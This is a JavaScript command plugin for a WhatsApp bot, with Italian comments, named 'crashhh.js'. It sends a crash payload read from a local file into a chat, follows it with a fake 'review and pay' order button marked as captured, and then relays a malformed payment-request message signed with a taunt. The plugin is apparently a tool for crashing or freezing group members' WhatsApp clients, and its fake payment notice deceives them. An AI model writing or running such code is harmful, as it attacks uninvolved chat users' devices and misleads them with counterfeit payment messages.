// Codice di crashhh.js

import fs from 'fs'
import path from 'path'

let handler = async (m, { conn }) => {
  const jid = m.chat
  const filePath = path.resolve('./storage/crash.txt')

  if (!fs.existsSync(filePath)) {
    return m.reply(`❌ *File non trovato!*\n🔎 Assicurati che axtral.txt esista nella cartella ./storage`)
  }

  const content = fs.readFileSync(filePath, 'utf-8')
  if (!content.trim()) {
    return m.reply('⚠️ *Il file axtral.txt è vuoto!*')
  }

  // 1) Mando il testo
  await conn.sendMessage(jid, { text: content }, { quoted: m })

  // 2) Mando il messaggio con il bottone
  await conn.sendMessage(
    jid,
    {
      text: 'Clicca per rivedere e pagare il tuo ordine.',
      interactiveButtons: [
        {
          name: 'review_and_pay',
          buttonParamsJson: JSON.stringify({
            currency: 'EUR',
            payment_configuration: 'varebot.it',
            payment_type: 'DEBIT_CARD',
            total_amount: { value: '1050', offset: '100' },
            reference_id: 'varebot',
            type: 'physical-goods',
            payment_method: 'confirm',
            payment_status: 'captured',
            payment_timestamp: Math.floor(Date.now() / 1000),
            order: {
              status: 'completed',
              description: 'Il tuo ordine di prova.',
              subtotal: { value: '1050', offset: '100' },
              order_type: 'PAYMENT_REQUEST',
              items: [
                {
                  retailer_id: 'your_retailer_id_123',
                  name: 'Prodotto di Esempio',
                  amount: { value: '1050', offset: '100' },
                  quantity: '1',
                },
              ],
            },
            additional_note: 'Grazie per il tuo acquisto!',
            native_payment_methods: [],
            share_payment_status: false,
          }),
        },
      ],
    },
    { quoted: m }
  )

  // 3) Mando il messaggio FOTTUTI BY 𝛬𝑿𝑻𝑹𝜜𝑳
  await conn.relayMessage(
    jid,
    {
      requestPaymentMessage: {
        noteMessage: {
          extendedTextMessage: {
            text: '𝐅𝐎𝐓𝐓𝐔𝐓𝐈 𝐁𝐘 𝛬𝑿𝑻𝑹𝜜𝑳',
            contextInfo: {
              externalAdReply: {
                title: 'Axtral_WiZaRd',
                body: 'Unisciti ora!',
                mediaType: 1,
                renderLargerThumbnail: true,
                showAdAttribution: false,
              },
            },
          },
          currencyCodeIso4217: 'USD',
          requestFrom: '0@s.whatsapp.net',
          amount: 99,
          expiryTimestamp: Date.now() + 99999,
        },
      },
    },
    {}
  )
}

handler.command = ['crashgp', 'hehehe']
handler.owner = true

export default handler